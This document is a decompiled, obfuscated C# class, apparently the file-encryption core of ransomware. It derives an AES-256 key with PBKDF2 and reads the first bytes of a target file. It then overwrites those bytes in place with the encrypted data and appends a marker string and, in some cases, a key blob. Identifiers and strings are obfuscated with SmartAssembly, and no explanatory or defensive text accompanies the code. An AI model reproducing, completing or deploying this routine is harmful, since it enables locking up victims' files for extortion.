using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace gZJMShdGuoGG;

public static class HAGwxQagSCcKAotj
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] pQEqVfqBQsgNPn(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = pSbTEFpNJpzOQUTh(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes pSbTEFpNJpzOQUTh(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] zQizjsdesaGi(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (pMhSnWjBfMXV.GvhFKpDNFWLzX == getString_0(107396907))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception)
		{
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void hoTNCLBmzKEOmkW(string AkPHKmcEBotoAnU, byte[] BenKFLIOMZMZK, byte[] rKUGgRbDKLE = null)
	{
		try
		{
			byte[] array = null;
			if (pMhSnWjBfMXV.GvhFKpDNFWLzX == getString_0(107396907))
			{
				array = (pMhSnWjBfMXV.rtwOYUfYif ? Encoding.ASCII.GetBytes(pMhSnWjBfMXV.XpzNMVUBwHhS(pMhSnWjBfMXV.UvWHlEcOdCgiTx) + pMhSnWjBfMXV.XpzNMVUBwHhS(getString_0(107405951)) + Convert.ToString(pMhSnWjBfMXV.zSkjAkSdrNaEQ) + pMhSnWjBfMXV.XpzNMVUBwHhS(getString_0(107405951))) : Encoding.ASCII.GetBytes(pMhSnWjBfMXV.XpzNMVUBwHhS(pMhSnWjBfMXV.UvWHlEcOdCgiTx) + pMhSnWjBfMXV.XpzNMVUBwHhS(getString_0(107405480)) + Convert.ToString(pMhSnWjBfMXV.zSkjAkSdrNaEQ) + pMhSnWjBfMXV.XpzNMVUBwHhS(getString_0(107405480))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(AkPHKmcEBotoAnU, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(BenKFLIOMZMZK, 0, BenKFLIOMZMZK.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(AkPHKmcEBotoAnU, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!pMhSnWjBfMXV.rtwOYUfYif)
				{
					fileStream.Write(array, 0, array.Length);
					return;
				}
				fileStream.Write(rKUGgRbDKLE, 0, rKUGgRbDKLE.Length);
				fileStream.Write(array, 0, array.Length);
				return;
			}
			array = (pMhSnWjBfMXV.rtwOYUfYif ? Encoding.ASCII.GetBytes(pMhSnWjBfMXV.XpzNMVUBwHhS(pMhSnWjBfMXV.UvWHlEcOdCgiTx) + pMhSnWjBfMXV.XpzNMVUBwHhS(getString_0(107405951)) + Convert.ToString(pMhSnWjBfMXV.zSkjAkSdrNaEQ) + pMhSnWjBfMXV.XpzNMVUBwHhS(getString_0(107405951))) : Encoding.ASCII.GetBytes(pMhSnWjBfMXV.XpzNMVUBwHhS(pMhSnWjBfMXV.UvWHlEcOdCgiTx) + pMhSnWjBfMXV.XpzNMVUBwHhS(getString_0(107405480)) + Convert.ToString(pMhSnWjBfMXV.zSkjAkSdrNaEQ) + pMhSnWjBfMXV.XpzNMVUBwHhS(getString_0(107405480))));
			FileStream fileStream2 = new FileStream(AkPHKmcEBotoAnU, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(BenKFLIOMZMZK, 0, BenKFLIOMZMZK.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream3 = new FileStream(AkPHKmcEBotoAnU, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!pMhSnWjBfMXV.rtwOYUfYif)
			{
				fileStream3.Write(array, 0, array.Length);
				return;
			}
			fileStream3.Write(rKUGgRbDKLE, 0, rKUGgRbDKLE.Length);
			fileStream3.Write(array, 0, array.Length);
		}
		catch (Exception)
		{
			byte[] array2 = null;
			array2 = (pMhSnWjBfMXV.rtwOYUfYif ? Encoding.ASCII.GetBytes(pMhSnWjBfMXV.XpzNMVUBwHhS(pMhSnWjBfMXV.UvWHlEcOdCgiTx) + pMhSnWjBfMXV.XpzNMVUBwHhS(getString_0(107405951)) + Convert.ToString(pMhSnWjBfMXV.zSkjAkSdrNaEQ) + pMhSnWjBfMXV.XpzNMVUBwHhS(getString_0(107405951))) : Encoding.ASCII.GetBytes(pMhSnWjBfMXV.XpzNMVUBwHhS(pMhSnWjBfMXV.UvWHlEcOdCgiTx) + pMhSnWjBfMXV.XpzNMVUBwHhS(getString_0(107405480)) + Convert.ToString(pMhSnWjBfMXV.zSkjAkSdrNaEQ) + pMhSnWjBfMXV.XpzNMVUBwHhS(getString_0(107405480))));
			FileStream fileStream4 = new FileStream(AkPHKmcEBotoAnU, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(BenKFLIOMZMZK, 0, BenKFLIOMZMZK.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(AkPHKmcEBotoAnU, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!pMhSnWjBfMXV.rtwOYUfYif)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(rKUGgRbDKLE, 0, rKUGgRbDKLE.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static HAGwxQagSCcKAotj()
	{
		Strings.CreateGetStringDelegate(typeof(HAGwxQagSCcKAotj));
	}
}
